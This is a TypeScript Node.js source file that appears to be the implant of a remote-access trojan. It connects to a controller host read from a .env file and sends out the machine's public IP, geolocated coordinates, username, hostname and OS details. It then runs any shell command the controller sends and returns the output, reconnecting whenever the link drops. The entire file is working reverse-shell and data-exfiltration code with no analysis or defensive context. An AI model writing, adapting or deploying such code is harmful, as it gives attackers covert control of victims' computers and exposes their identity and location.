import { config } from 'dotenv'
import { connect, type Socket } from 'node:net'
import path from 'node:path'
import { exec } from 'node:child_process'
import os from 'node:os'
import { Ip } from './models/Ip'

const { publicIpv4 } = require('fix-esm').require('public-ip')

config({
  path: path.resolve('src', 'server-template', '.env')
})

let socket: Socket
let isConnected = false

function connectSocket (): void {
  if (!isConnected) {
    socket = connect({
      host: process.env.HOST,
      port: Number(process.env.PORT),
      allowHalfOpen: true,
      keepAlive: true
    })
  }

  socket.on('error', () => {
    isConnected = false
    setTimeout(connectSocket, 5000)
  })

  socket.on('ready', async () => {
    const ip: string = await publicIpv4()
    const ipModel = new Ip(ip)

    await ipModel.query()

    const data = {
      type: 'INFO',
      data: {
        ip,
        username: os.userInfo().username,
        hostname: os.hostname(),
        country: ipModel.country,
        lat: ipModel.lat,
        lon: ipModel.lon,
        regionName: ipModel.regionName,
        cpu: os.arch(),
        os: os.type()
      }
    }

    socket.write(JSON.stringify(data))

    isConnected = true
  })

  socket.on('data', (event) => {
    const payload = JSON.parse(event.toString())

    switch (payload.type) {
      case 'INIT':
        exec('echo -n $PS1', (_error, stdout) => {
          socket.write(JSON.stringify({
            type: 'INIT',
            data: stdout.toString()
          }))
        })
        break
      case 'COMMAND':
        exec(payload.data as string, (_error, stdout) => {
          socket.write(JSON.stringify({
            data: stdout,
            type: 'COMMAND_RESPONSE'
          }))
        })
        break
      default:
        break
    }
  })
}

connectSocket()
